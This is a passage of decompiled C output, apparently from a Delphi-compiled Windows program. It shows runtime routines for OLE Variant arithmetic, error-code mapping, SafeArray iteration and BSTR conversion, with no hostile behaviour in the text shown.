  _DAT_004197a8 = FUN_0040cad8(s_VarAdd_0040cd30,FUN_0040c6b0,puVar3,(int)&stack0xfffffffc);
  _DAT_004197ac = FUN_0040cad8(s_VarSub_0040cd38,FUN_0040c6b0,puVar4,(int)&stack0xfffffffc);
  _DAT_004197b0 = FUN_0040cad8(s_VarMul_0040cd40,FUN_0040c6b0,puVar5,(int)&stack0xfffffffc);
  _DAT_004197b4 = FUN_0040cad8(s_VarDiv_0040cd48,FUN_0040c6b0,puVar6,(int)&stack0xfffffffc);
  _DAT_004197b8 = FUN_0040cad8(s_VarIdiv_0040cd50,FUN_0040c6b0,puVar7,(int)&stack0xfffffffc);
  _DAT_004197bc = FUN_0040cad8(s_VarMod_0040cd58,FUN_0040c6b0,puVar8,(int)&stack0xfffffffc);
  _DAT_004197c0 = FUN_0040cad8(s_VarAnd_0040cd60,FUN_0040c6b0,puVar9,(int)&stack0xfffffffc);
  _DAT_004197c4 = FUN_0040cad8(s_VarOr_0040cd68,FUN_0040c6b0,puVar10,(int)&stack0xfffffffc);
  _DAT_004197c8 = FUN_0040cad8(s_VarXor_0040cd70,FUN_0040c6b0,puVar11,(int)&stack0xfffffffc);
  _DAT_004197cc = FUN_0040cad8(s_VarCmp_0040cd78,FUN_0040c6bc,puVar12,(int)&stack0xfffffffc);
  _DAT_004197d0 = FUN_0040cad8(s_VarI4FromStr_0040cd80,FUN_0040c6c8,puVar13,(int)&stack0xfffffffc);
  _DAT_004197d4 =
       FUN_0040cad8(s_VarR4FromStr_0040cd90,(FARPROC)&LAB_0040c734,puVar14,(int)&stack0xfffffffc);
  _DAT_004197d8 =
       FUN_0040cad8(s_VarR8FromStr_0040cda0,(FARPROC)&LAB_0040c7a0,puVar15,(int)&stack0xfffffffc);
  _DAT_004197dc =
       FUN_0040cad8(s_VarDateFromStr_0040cdb0,(FARPROC)&LAB_0040c80c,puVar16,(int)&stack0xfffffffc);
  _DAT_004197e0 =
       FUN_0040cad8(s_VarCyFromStr_0040cdc0,(FARPROC)&LAB_0040c878,puVar17,(int)&stack0xfffffffc);
  _DAT_004197e4 =
       FUN_0040cad8(s_VarBoolFromStr_0040cdd0,(FARPROC)&LAB_0040c8e4,puVar18,(int)&stack0xfffffffc);
  DAT_004197e8 = FUN_0040cad8(s_VarBstrFromCy_0040cde0,(FARPROC)&LAB_0040c964,puVar19,
                              (int)&stack0xfffffffc);
  DAT_004197ec = FUN_0040cad8(s_VarBstrFromDate_0040cdf0,(FARPROC)&LAB_0040c9d4,puVar20,
                              (int)&stack0xfffffffc);
  DAT_004197f0 = FUN_0040cad8(s_VarBstrFromBool_0040ce00,(FARPROC)&LAB_0040ca44,puVar21,
                              (int)&stack0xfffffffc);
  return;
}



void FUN_0040d428(void)

{
  int *piVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 *local_8;
  
  puStack_c = &stack0xfffffffc;
  local_8 = (undefined4 *)0x0;
  puStack_10 = &LAB_0040d472;
  uStack_14 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_14;
  FUN_00405ac0((int **)PTR_PTR_DAT_004185e8,(int *)&local_8);
  piVar1 = FUN_0040a8f8((int *)PTR_DAT_0040cfd0,'\x01',local_8);
  FUN_00403abc((int)piVar1);
  *in_FS_OFFSET = uStack_14;
  puStack_c = &LAB_0040d479;
  puStack_10 = (undefined *)0x40d471;
  FUN_0040405c((int *)&local_8);
  return;
}



void FUN_0040d47c(uint param_1,uint param_2)

{
  int iVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar2;
  int *piVar3;
  undefined *puStack_34;
  undefined *puStack_30;
  undefined *puStack_2c;
  byte *local_20;
  int local_1c;
  int local_18;
  int local_14;
  undefined local_10;
  int local_c;
  undefined local_8;
  
  puStack_2c = &stack0xfffffffc;
  local_18 = 0;
  local_1c = 0;
  local_20 = (byte *)0x0;
  puStack_30 = &LAB_0040d50b;
  puStack_34 = (undefined *)*in_FS_OFFSET;
  *in_FS_OFFSET = &puStack_34;
  FUN_0040f028(param_1,&local_18);
  local_14 = local_18;
  local_10 = 0xb;
  FUN_0040f028(param_2,&local_1c);
  local_c = local_1c;
  local_8 = 0xb;
  piVar3 = &local_14;
  uVar2 = 1;
  FUN_00405ac0((int **)PTR_PTR_DAT_004184e4,(int *)&local_20);
  iVar1 = FUN_0040a934((int)PTR_DAT_0040cfd0,'\x01',local_20,uVar2,piVar3);
  FUN_00403abc(iVar1);
  *in_FS_OFFSET = uVar2;
  puStack_34 = &LAB_0040d512;
  FUN_00404080((int *)&local_20,3);
  return;
}



void FUN_0040d518(void)

{
  int *piVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 *local_8;
  
  puStack_c = &stack0xfffffffc;
  local_8 = (undefined4 *)0x0;
  puStack_10 = &LAB_0040d562;
  uStack_14 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_14;
  FUN_00405ac0((int **)PTR_PTR_DAT_004185c4,(int *)&local_8);
  piVar1 = FUN_0040a8f8((int *)PTR_DAT_0040cf6c,'\x01',local_8);
  FUN_00403abc((int)piVar1);
  *in_FS_OFFSET = uStack_14;
  puStack_c = &LAB_0040d569;
  puStack_10 = (undefined *)0x40d561;
  FUN_0040405c((int *)&local_8);
  return;
}



void FUN_0040d56c(uint param_1,uint param_2)

{
  int iVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uVar2;
  int *piVar3;
  undefined *puStack_34;
  undefined *puStack_30;
  undefined *puStack_2c;
  byte *local_20;
  int local_1c;
  int local_18;
  int local_14;
  undefined local_10;
  int local_c;
  undefined local_8;
  
  puStack_2c = &stack0xfffffffc;
  local_18 = 0;
  local_1c = 0;
  local_20 = (byte *)0x0;
  puStack_30 = &LAB_0040d5fb;
  puStack_34 = (undefined *)*in_FS_OFFSET;
  *in_FS_OFFSET = &puStack_34;
  FUN_0040f028(param_1,&local_18);
  local_14 = local_18;
  local_10 = 0xb;
  FUN_0040f028(param_2,&local_1c);
  local_c = local_1c;
  local_8 = 0xb;
  piVar3 = &local_14;
  uVar2 = 1;
  FUN_00405ac0((int **)PTR_PTR_DAT_00418630,(int *)&local_20);
  iVar1 = FUN_0040a934((int)PTR_DAT_0040d034,'\x01',local_20,uVar2,piVar3);
  FUN_00403abc(iVar1);
  *in_FS_OFFSET = uVar2;
  puStack_34 = &LAB_0040d602;
  FUN_00404080((int *)&local_20,3);
  return;
}



void FUN_0040d608(void)

{
  int *piVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 *local_8;
  
  puStack_c = &stack0xfffffffc;
  local_8 = (undefined4 *)0x0;
  puStack_10 = &LAB_0040d652;
  uStack_14 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_14;
  FUN_00405ac0((int **)PTR_PTR_DAT_004185a0,(int *)&local_8);
  piVar1 = FUN_0040a8f8((int *)PTR_DAT_0040d22c,'\x01',local_8);
  FUN_00403abc((int)piVar1);
  *in_FS_OFFSET = uStack_14;
  puStack_c = &LAB_0040d659;
  puStack_10 = (undefined *)0x40d651;
  FUN_0040405c((int *)&local_8);
  return;
}



void FUN_0040d65c(DWORD param_1)

{
  int *piVar1;
  int iVar2;
  undefined4 *unaff_EBX;
  undefined4 *in_FS_OFFSET;
  byte *local_44;
  int local_40;
  undefined4 local_3c;
  undefined local_38;
  DWORD local_34;
  undefined local_30;
  int local_2c;
  undefined4 local_28;
  undefined4 *in_stack_ffffffdc;
  undefined4 *puVar3;
  undefined4 *local_1c;
  undefined4 *local_18;
  undefined4 *local_14;
  undefined4 *local_c;
  undefined4 *local_8;
  
  local_14 = (undefined4 *)&stack0xfffffffc;
  iVar2 = 8;
  do {
    local_8 = (undefined4 *)0x0;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  local_18 = (undefined4 *)&LAB_0040d8a1;
  local_1c = (undefined4 *)*in_FS_OFFSET;
  *in_FS_OFFSET = &local_1c;
  if ((int)param_1 < -0x7ffdfff5) {
    if (param_1 == 0x8002000a) {
      local_14 = (undefined4 *)&stack0xfffffffc;
      FUN_00405ac0((int **)PTR_PTR_DAT_00418520,(int *)&local_c);
      piVar1 = FUN_0040a8f8((int *)PTR_DAT_0040d034,'\x01',local_c);
      FUN_00403abc((int)piVar1);
      goto LAB_0040d879;
    }
    if ((int)param_1 < -0x7ffdfffa) {
      if (param_1 == 0x80020005) {
        local_14 = (undefined4 *)&stack0xfffffffc;
        FUN_0040d428();
        goto LAB_0040d879;
      }
      if (param_1 == 0x80004001) {
        local_14 = (undefined4 *)&stack0xfffffffc;
        FUN_00405ac0((int **)PTR_PTR_DAT_0041860c,(int *)&local_18);
        piVar1 = FUN_0040a8f8((int *)PTR_DAT_0040d294,'\x01',local_18);
        FUN_00403abc((int)piVar1);
        goto LAB_0040d879;
      }
      if (param_1 == 0x8000ffff) {
        local_14 = (undefined4 *)&stack0xfffffffc;
        FUN_00405ac0((int **)PTR_PTR_DAT_0041851c,(int *)&stack0xffffffdc);
        piVar1 = FUN_0040a8f8((int *)PTR_DAT_0040d360,'\x01',in_stack_ffffffdc);
        FUN_00403abc((int)piVar1);
        goto LAB_0040d879;
      }
    }
    else {
      if (param_1 == 0x80020008) {
        local_14 = (undefined4 *)&stack0xfffffffc;
        FUN_00405ac0((int **)PTR_PTR_DAT_004186ac,(int *)&local_8);
        piVar1 = FUN_0040a8f8((int *)PTR_DAT_0040d0fc,'\x01',local_8);
        FUN_00403abc((int)piVar1);
        goto LAB_0040d879;
      }
      if (param_1 == 0x80020009) {
        local_14 = (undefined4 *)&stack0xfffffffc;
        FUN_0040d518();
        goto LAB_0040d879;
      }
    }
  }
  else {
    if (param_1 == 0x8002000b) {
      FUN_00405ac0((int **)PTR_PTR_DAT_0041866c,(int *)&stack0xfffffff0);
      piVar1 = FUN_0040a8f8((int *)PTR_DAT_0040d160,'\x01',unaff_EBX);
      FUN_00403abc((int)piVar1);
      goto LAB_0040d879;
    }
    if (param_1 == 0x8002000d) {
      local_14 = (undefined4 *)&stack0xfffffffc;
      FUN_00405ac0((int **)PTR_PTR_DAT_004186e0,(int *)&local_14);
      piVar1 = FUN_0040a8f8((int *)PTR_DAT_0040d1c4,'\x01',local_14);
      FUN_00403abc((int)piVar1);
      goto LAB_0040d879;
    }
    if (param_1 == 0x8007000e) {
      local_14 = (undefined4 *)&stack0xfffffffc;
      FUN_00405ac0((int **)PTR_PTR_DAT_00418544,(int *)&local_1c);
      piVar1 = FUN_0040a8f8((int *)PTR_DAT_0040d2f8,'\x01',local_1c);
      FUN_00403abc((int)piVar1);
      goto LAB_0040d879;
    }
    if (param_1 == 0x80070057) {
      puVar3 = (undefined4 *)0x40d7f0;
      local_14 = (undefined4 *)&stack0xfffffffc;
      FUN_00405ac0((int **)PTR_PTR_DAT_00418558,(int *)&stack0xffffffe0);
      piVar1 = FUN_0040a8f8((int *)PTR_DAT_0040d098,'\x01',puVar3);
      FUN_00403abc((int)piVar1);
      goto LAB_0040d879;
    }
  }
  local_3c = *(undefined4 *)PTR_PTR_DAT_004186b8;
  local_38 = 0xb;
  local_30 = 0;
  local_34 = param_1;
  local_14 = (undefined4 *)&stack0xfffffffc;
  FUN_0040a0f0(param_1,&local_40);
  local_2c = local_40;
  puVar3 = &local_3c;
  in_stack_ffffffdc = (undefined4 *)0x2;
  local_28 = 0x40d865;
  FUN_00405ac0((int **)PTR_PTR_DAT_004185a4,(int *)&local_44);
  local_28 = 0x40d874;
  iVar2 = FUN_0040a934((int)PTR_DAT_00406c00,'\x01',local_44,in_stack_ffffffdc,puVar3);
  local_28 = 0x40d879;
  FUN_00403abc(iVar2);
LAB_0040d879:
  *in_FS_OFFSET = in_stack_ffffffdc;
  local_1c = (undefined4 *)&LAB_0040d8a8;
  FUN_00404080((int *)&local_44,2);
  FUN_00404080((int *)&stack0xffffffdc,8);
  return;
}



void FUN_0040d8b0(DWORD param_1)

{
  if (param_1 != 0) {
    FUN_0040d65c(param_1);
  }
  return;
}



void FUN_0040d8bc(DWORD param_1,uint param_2,uint param_3)

{
  if (param_1 != 0) {
    if (param_1 == 0x80020005) {
      FUN_0040d47c(param_2,param_3);
    }
    else if (param_1 == 0x8002000a) {
      FUN_0040d56c(param_2,param_3);
    }
    else {
      FUN_0040d65c(param_1);
    }
  }
  return;
}



void FUN_0040d8f0(void)

{
  int *piVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 *local_8;
  
  puStack_c = &stack0xfffffffc;
  local_8 = (undefined4 *)0x0;
  puStack_10 = &LAB_0040d93a;
  uStack_14 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_14;
  FUN_00405ac0((int **)PTR_PTR_DAT_004184dc,(int *)&local_8);
  piVar1 = FUN_0040a8f8((int *)PTR_DAT_0040d3c4,'\x01',local_8);
  FUN_00403abc((int)piVar1);
  *in_FS_OFFSET = uStack_14;
  puStack_c = &LAB_0040d941;
  puStack_10 = (undefined *)0x40d939;
  FUN_0040405c((int *)&local_8);
  return;
}



undefined4 FUN_0040d944(int param_1,undefined4 param_2,undefined4 param_3,int param_4)

{
  bool bVar1;
  int iVar2;
  undefined4 uVar3;
  
  do {
    iVar2 = *(int *)(param_4 + -0x2fc + param_1 * 8) + *(int *)(param_4 + -0x300 + param_1 * 8);
    bVar1 = *(int *)(param_4 + -0x100 + param_1 * 4) < iVar2;
    uVar3 = CONCAT31((int3)((uint)iVar2 >> 8),bVar1);
    param_1 = param_1 + -1;
    if (!bVar1) {
      return uVar3;
    }
  } while (-1 < param_1);
  return uVar3;
}



undefined4 FUN_0040d974(int param_1,undefined4 param_2,undefined4 param_3,int param_4)

{
  int *piVar1;
  int iVar2;
  undefined4 uVar3;
  
  uVar3 = CONCAT31((int3)((uint)param_2 >> 8),1);
  piVar1 = (int *)(param_4 + -0x100 + param_1 * 4);
  *piVar1 = *piVar1 + 1;
  iVar2 = *(int *)(param_4 + -0x2fc + param_1 * 8);
  if (iVar2 + *(int *)(param_4 + -0x300 + param_1 * 8) <= *(int *)(param_4 + -0x100 + param_1 * 4))
  {
    if (param_1 == 0) {
      uVar3 = 0;
    }
    else {
      *(int *)(param_4 + -0x100 + param_1 * 4) = iVar2;
      uVar3 = FUN_0040d974(param_1 + -1,param_4,iVar2,param_4);
    }
  }
  return uVar3;
}



void FUN_0040d9d0(VARIANTARG *param_1,undefined4 param_2,undefined *param_3)

{
  ushort uVar1;
  uint uVar2;
  DWORD DVar3;
  undefined4 *puVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  undefined *extraout_ECX;
  undefined *extraout_ECX_00;
  int *extraout_ECX_01;
  undefined *extraout_ECX_02;
  undefined *puVar7;
  VARIANTARG *pVVar8;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  VARIANTARG *extraout_EDX_02;
  VARIANTARG **ppVVar9;
  int iVar10;
  VARIANTARG *local_318;
  uint local_314;
  int local_310;
  SAFEARRAY *local_30c;
  VARIANTARG *local_308;
  VARIANTARG *local_304;
  undefined4 local_300 [127];
  VARIANTARG local_104 [16];
  
  local_308 = param_1;
  if ((*(byte *)((int)&param_1->n1 + 1) & 0x20) == 0) {
    FUN_0040d8b0(0x80070057);
    param_3 = extraout_ECX;
  }
  uVar1 = (local_308->n1).n2.vt;
  if ((uVar1 & 0xfff) == 0xc) {
    if ((uVar1 & 0x4000) == 0) {
      local_30c = *(SAFEARRAY **)((int)&local_308->n1 + 8);
    }
    else {
      local_30c = **(SAFEARRAY ***)((int)&local_308->n1 + 8);
    }
    uVar2 = (uint)local_30c->cDims;
    pVVar8 = local_308;
    local_314 = uVar2;
    if (-1 < (int)(uVar2 - 1)) {
      iVar10 = 0;
      ppVVar9 = &local_304;
      do {
        DVar3 = SafeArrayGetLBound(local_30c,iVar10 + 1,(LONG *)(ppVVar9 + 1));
        FUN_0040d8b0(DVar3);
        DVar3 = SafeArrayGetUBound(local_30c,iVar10 + 1,&local_310);
        FUN_0040d8b0(DVar3);
        pVVar8 = (VARIANTARG *)((local_310 - (int)ppVVar9[1]) + 1);
        *ppVVar9 = pVVar8;
        iVar10 = iVar10 + 1;
        ppVVar9 = ppVVar9 + 2;
        uVar2 = uVar2 - 1;
        param_3 = extraout_ECX_00;
      } while (uVar2 != 0);
    }
    if (-1 < (int)(local_314 - 1)) {
      puVar4 = local_300;
      pVVar8 = local_104;
      uVar2 = local_314;
      do {
        param_3 = (undefined *)*puVar4;
        *(undefined **)&pVVar8->n1 = param_3;
        pVVar8 = (VARIANTARG *)((int)&pVVar8->n1 + 4);
        puVar4 = puVar4 + 2;
        uVar2 = uVar2 - 1;
      } while (uVar2 != 0);
    }
    do {
      iVar10 = local_314 - 1;
      puVar7 = &stack0xfffffffc;
      uVar5 = FUN_0040d944(iVar10,pVVar8,param_3,(int)&stack0xfffffffc);
      uVar6 = extraout_EDX;
      if ((char)uVar5 != '\0') {
        DVar3 = SafeArrayPtrOfIndex(local_30c,(LONG *)local_104,&local_318);
        FUN_0040d8b0(DVar3);
        FUN_0040dbc8(local_318,extraout_EDX_00,extraout_ECX_01);
        puVar7 = extraout_ECX_02;
        uVar6 = extraout_EDX_01;
      }
      param_3 = &stack0xfffffffc;
      uVar6 = FUN_0040d974(iVar10,uVar6,puVar7,(int)&stack0xfffffffc);
      pVVar8 = extraout_EDX_02;
    } while ((char)uVar6 != '\0');
  }
  DVar3 = VariantClear(local_308);
  FUN_0040d8b0(DVar3);
  return;
}



void FUN_0040db4c(VARIANTARG *param_1,undefined4 param_2,int *param_3)

{
  ushort uVar1;
  DWORD DVar2;
  int iVar3;
  undefined4 unaff_ESI;
  int *local_c;
  
  uVar1 = (param_1->n1).n2.vt;
  local_c = param_3;
  if (uVar1 < 0x14) {
    DVar2 = VariantClear(param_1);
    FUN_0040d8b0(DVar2);
  }
  else if (uVar1 == 0x100) {
    (param_1->n1).n2.vt = 0;
    FUN_0040405c((int *)((int)&param_1->n1 + 8));
  }
  else if (uVar1 == 0x101) {
    (*DAT_0041980c)(param_1);
  }
  else if ((uVar1 & 0x2000) == 0) {
    iVar3 = FUN_0040f484(CONCAT22((short)((uint)unaff_ESI >> 0x10),uVar1),&local_c);
    if ((char)iVar3 == '\0') {
      DVar2 = VariantClear(param_1);
      FUN_0040d8b0(DVar2);
    }
    else {
      (**(code **)(*local_c + 0x24))(local_c,param_1);
    }
  }
  else {
    FUN_0040d9d0(param_1,param_2,(undefined *)param_3);
  }
  return;
}



void FUN_0040dbc8(VARIANTARG *param_1,undefined4 param_2,int *param_3)

{
  if (((param_1->n1).n2.vt & 0xbfe8) == 0) {
    (param_1->n1).n2.vt = 0;
    return;
  }
  FUN_0040db4c(param_1,param_2,param_3);
  return;
}



VARIANTARG * FUN_0040dbdc(VARIANTARG *param_1,undefined4 param_2,int *param_3)

{
  FUN_0040dbc8(param_1,param_2,param_3);
  return param_1;
}



undefined4 FUN_0040dbe4(int param_1,undefined4 param_2,undefined4 param_3,int param_4)

{
  bool bVar1;
  int iVar2;
  undefined4 uVar3;
  
  do {
    iVar2 = *(int *)(param_4 + -0x2fc + param_1 * 8) + *(int *)(param_4 + -0x300 + param_1 * 8);
    bVar1 = *(int *)(param_4 + -0x100 + param_1 * 4) < iVar2;
    uVar3 = CONCAT31((int3)((uint)iVar2 >> 8),bVar1);
    param_1 = param_1 + -1;
    if (!bVar1) {
      return uVar3;
    }
  } while (-1 < param_1);
  return uVar3;
}



undefined4 FUN_0040dc14(int param_1,undefined4 param_2,undefined4 param_3,int param_4)

{
  int *piVar1;
  int iVar2;
  undefined4 uVar3;
  
  uVar3 = CONCAT31((int3)((uint)param_2 >> 8),1);
  piVar1 = (int *)(param_4 + -0x100 + param_1 * 4);
  *piVar1 = *piVar1 + 1;
  iVar2 = *(int *)(param_4 + -0x2fc + param_1 * 8);
  if (iVar2 + *(int *)(param_4 + -0x300 + param_1 * 8) <= *(int *)(param_4 + -0x100 + param_1 * 4))
  {
    if (param_1 == 0) {
      uVar3 = 0;
    }
    else {
      *(int *)(param_4 + -0x100 + param_1 * 4) = iVar2;
      uVar3 = FUN_0040dc14(param_1 + -1,param_4,iVar2,param_4);
    }
  }
  return uVar3;
}



void FUN_0040dc70(VARIANTARG *param_1,VARIANTARG *param_2,undefined *param_3)

{
  ushort uVar1;
  uint uVar2;
  DWORD DVar3;
  SAFEARRAY *psa;
  LONG *pLVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  int *extraout_ECX;
  int *extraout_ECX_00;
  int *piVar7;
  undefined *extraout_ECX_01;
  undefined *puVar8;
  undefined *extraout_ECX_02;
  undefined *puVar9;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  LONG *extraout_EDX_01;
  LONG *pLVar10;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  LONG *extraout_EDX_04;
  UINT UVar11;
  SAFEARRAYBOUND *pSVar12;
  int iVar13;
  void *local_320;
  void *local_31c;
  SAFEARRAY *local_318;
  uint local_314;
  int local_310;
  code *local_30c;
  VARIANTARG *local_308;
  SAFEARRAYBOUND local_304 [64];
  LONG local_104 [64];
  
  local_30c = (code *)param_3;
  local_308 = param_1;
  if ((*(byte *)((int)&param_2->n1 + 1) & 0x20) == 0) {
    FUN_0040d8b0(0x80070057);
  }
  uVar1 = (param_2->n1).n2.vt;
  if ((uVar1 & 0xfff) == 0xc) {
    if ((uVar1 & 0x4000) == 0) {
      local_318 = *(SAFEARRAY **)((int)&param_2->n1 + 8);
    }
    else {
      local_318 = **(SAFEARRAY ***)((int)&param_2->n1 + 8);
    }
    uVar2 = (uint)local_318->cDims;
    local_314 = uVar2;
    if (-1 < (int)(uVar2 - 1)) {
      iVar13 = 0;
      pSVar12 = local_304;
      do {
        DVar3 = SafeArrayGetLBound(local_318,iVar13 + 1,&pSVar12->lLbound);
        FUN_0040d8b0(DVar3);
        DVar3 = SafeArrayGetUBound(local_318,iVar13 + 1,&local_310);
        FUN_0040d8b0(DVar3);
        pSVar12->cElements = (local_310 - pSVar12->lLbound) + 1;
        iVar13 = iVar13 + 1;
        pSVar12 = pSVar12 + 1;
        uVar2 = uVar2 - 1;
      } while (uVar2 != 0);
    }
    psa = SafeArrayCreate(0xc,local_314,local_304);
    piVar7 = extraout_ECX;
    uVar6 = extraout_EDX;
    if (psa == (SAFEARRAY *)0x0) {
      FUN_0040d608();
      piVar7 = extraout_ECX_00;
      uVar6 = extraout_EDX_00;
    }
    FUN_0040dbc8(local_308,uVar6,piVar7);
    (local_308->n1).n2.vt = 0x200c;
    *(SAFEARRAY **)((int)&local_308->n1 + 8) = psa;
    puVar8 = extraout_ECX_01;
    pLVar10 = extraout_EDX_01;
    if (-1 < (int)(local_314 - 1)) {
      pLVar4 = &local_304[0].lLbound;
      pLVar10 = local_104;
      UVar11 = local_314;
      do {
        puVar8 = (undefined *)*pLVar4;
        *pLVar10 = (LONG)puVar8;
        pLVar10 = pLVar10 + 1;
        pLVar4 = pLVar4 + 2;
        UVar11 = UVar11 - 1;
      } while (UVar11 != 0);
    }
    do {
      iVar13 = local_314 - 1;
      puVar9 = &stack0xfffffffc;
      uVar5 = FUN_0040dbe4(iVar13,pLVar10,puVar8,(int)&stack0xfffffffc);
      uVar6 = extraout_EDX_02;
      if ((char)uVar5 != '\0') {
        DVar3 = SafeArrayPtrOfIndex(local_318,local_104,&local_31c);
        FUN_0040d8b0(DVar3);
        DVar3 = SafeArrayPtrOfIndex(psa,local_104,&local_320);
        FUN_0040d8b0(DVar3);
        (*local_30c)(local_320,local_31c);
        puVar9 = extraout_ECX_02;
        uVar6 = extraout_EDX_03;
      }
      puVar8 = &stack0xfffffffc;
      uVar6 = FUN_0040dc14(iVar13,uVar6,puVar9,(int)&stack0xfffffffc);
      pLVar10 = extraout_EDX_04;
    } while ((char)uVar6 != '\0');
  }
  else {
    DVar3 = VariantCopy(local_308,param_2);
    FUN_0040d8b0(DVar3);
  }
  return;
}



void FUN_0040de44(VARIANTARG *param_1,VARIANTARG *param_2,int *param_3)

{
  ushort uVar1;
  DWORD DVar2;
  int iVar3;
  undefined4 unaff_EDI;
  int *local_10;
  
  local_10 = param_3;
  if (((param_1->n1).n2.vt & 0xbfe8) != 0) {
    FUN_0040db4c(param_1,param_2,param_3);
  }
  uVar1 = (param_2->n1).n2.vt;
  if (uVar1 < 0x14) {
    DVar2 = VariantCopy(param_1,param_2);
    FUN_0040d8b0(DVar2);
  }
  else if (uVar1 == 0x100) {
    (param_1->n1).n2.vt = 0x100;
    *(undefined4 *)((int)&param_1->n1 + 8) = 0;
    FUN_004040b0((int *)((int)&param_1->n1 + 8),*(undefined4 **)((int)&param_2->n1 + 8));
  }
  else if (uVar1 == 0x101) {
    (param_1->n1).n2.vt = 0x101;
    *(undefined4 *)((int)&param_1->n1 + 8) = *(undefined4 *)((int)&param_2->n1 + 8);
    (*DAT_00419814)(param_1);
  }
  else if ((uVar1 & 0x2000) == 0) {
    iVar3 = FUN_0040f484(CONCAT22((short)((uint)unaff_EDI >> 0x10),uVar1),&local_10);
    if ((char)iVar3 == '\0') {
      DVar2 = VariantCopy(param_1,param_2);
      FUN_0040d8b0(DVar2);
    }
    else {
      (**(code **)(*local_10 + 0x28))(local_10,param_1,param_2,0);
    }
  }
  else {
    FUN_0040dc70(param_1,param_2,&LAB_0040de3c);
  }
  return;
}



void FUN_0040def0(VARIANTARG *param_1,VARIANTARG *param_2,int *param_3)

{
  if (param_1 != param_2) {
    if (((param_2->n1).n2.vt & 0xbfe8) == 0) {
      if (((param_1->n1).n2.vt & 0xbfe8) != 0) {
        FUN_0040db4c(param_1,param_2,param_3);
      }
      *(undefined4 *)&param_1->n1 = *(undefined4 *)&param_2->n1;
      (param_1->n1).decVal.Hi32 = (param_2->n1).decVal.Hi32;
      *(undefined4 *)((int)&param_1->n1 + 8) = *(undefined4 *)((int)&param_2->n1 + 8);
      *(undefined4 *)((int)&param_1->n1 + 0xc) = *(undefined4 *)((int)&param_2->n1 + 0xc);
    }
    else {
      FUN_0040de44(param_1,param_2,param_3);
    }
  }
  return;
}



void FUN_0040df34(BSTR *param_1,undefined param_2,undefined param_3,undefined4 param_4,
                 undefined4 param_5)

{
  DWORD DVar1;
  undefined2 extraout_var;
  undefined2 extraout_var_00;
  
  FUN_004046e4(param_1);
  DVar1 = (**(code **)PTR_DAT_00418524)();
  FUN_0040d8bc(DVar1,CONCAT22(extraout_var_00,6),CONCAT22(extraout_var,8));
  return;
}



void FUN_0040df6c(BSTR *param_1,undefined param_2,undefined param_3,undefined4 param_4,
                 undefined4 param_5)

{
  DWORD DVar1;
  undefined2 extraout_var;
  undefined2 extraout_var_00;
  
  FUN_004046e4(param_1);
  DVar1 = (**(code **)PTR_DAT_004185d4)();
  FUN_0040d8bc(DVar1,CONCAT22(extraout_var_00,7),CONCAT22(extraout_var,8));
  return;
}



void FUN_0040dfa4(undefined4 param_1,BSTR *param_2)

{
  DWORD DVar1;
  undefined2 extraout_var;
  undefined2 extraout_var_00;
  undefined4 *in_FS_OFFSET;
  undefined4 uStack_28;
  undefined *puStack_24;
  undefined *puStack_20;
  byte *local_14;
  byte *local_10;
  byte *local_c;
  byte *local_8;
  
  puStack_20 = &stack0xfffffffc;
  local_8 = (byte *)0x0;
  local_c = (byte *)0x0;
  local_10 = (byte *)0x0;
  local_14 = (byte *)0x0;
  puStack_24 = &LAB_0040e05a;
  uStack_28 = *in_FS_OFFSET;
  *in_FS_OFFSET = &uStack_28;
  FUN_004046e4(param_2);
  DVar1 = (**(code **)PTR_DAT_00418670)();
  FUN_0040d8bc(DVar1,CONCAT22(extraout_var_00,0xb),CONCAT22(extraout_var,8));
  if ((char)PTR_FUN_00418320 != '\0') {
    if ((char)PTR_FUN_00418320 == '\x01') {
      FUN_004042e4((LPSTR *)&local_c,*param_2);
      FUN_00407084(local_c,&local_8);
      FUN_00404830(param_2,(LPCSTR)local_8);
    }
    else if ((char)PTR_FUN_00418320 == '\x02') {
      FUN_004042e4((LPSTR *)&local_14,*param_2);
      FUN_00407048(local_14,&local_10);
      FUN_00404830(param_2,(LPCSTR)local_10);
    }
    else {
      FUN_0040d518();
    }
  }
  *in_FS_OFFSET = param_1;
  FUN_00404080((int *)&local_14,4);
  return;
}



void FUN_0040e068(undefined2 *param_1,LPSTR *param_2)

{
  DWORD DVar1;
  undefined2 extraout_var;
  undefined2 extraout_var_00;
  VARIANTARG **in_FS_OFFSET;
  LPCWSTR *ppWVar2;
  undefined4 uStack_3c;
  undefined4 uStack_38;
  undefined4 uStack_30;
  undefined4 uStack_2c;
  undefined4 uStack_28;
  BSTR local_1c;
  LPCWSTR local_18;
  VARIANTARG local_14;
  
  uStack_28 = &stack0xfffffffc;
  local_18 = (LPCWSTR)0x0;
  local_1c = (BSTR)0x0;
  uStack_2c = (ULONG)&LAB_0040e127;
  uStack_30 = *in_FS_OFFSET;
  *in_FS_OFFSET = (VARIANTARG *)&stack0xffffffd0;
  uStack_38 = 0x40e093;
  VariantInit(&local_14);
  uStack_38 = (ULONG)&LAB_0040e105;
  uStack_3c = *in_FS_OFFSET;
  *in_FS_OFFSET = (VARIANTARG *)&stack0xffffffc4;
  DVar1 = (**(code **)PTR_DAT_00418684)();
  FUN_0040d8bc(DVar1,CONCAT22(extraout_var_00,*param_1),CONCAT22(extraout_var,0x100));
  ppWVar2 = &local_18;
  FUN_004047f4(&local_1c,(OLECHAR *)local_14.n1._8_4_);
  FUN_004048e0((uint)local_1c,1,0x7fffffff,ppWVar2);
